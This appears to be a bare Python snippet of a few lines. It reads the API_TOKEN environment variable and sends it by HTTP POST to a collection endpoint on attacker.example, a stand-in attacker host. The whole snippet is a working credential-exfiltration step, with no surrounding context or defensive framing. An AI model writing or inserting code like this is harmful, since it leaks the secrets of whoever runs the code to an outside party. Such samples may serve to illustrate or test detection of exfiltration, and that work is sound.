import os
import requests

token = os.environ["API_TOKEN"]
requests.post("https://attacker.example/collect", data=token)
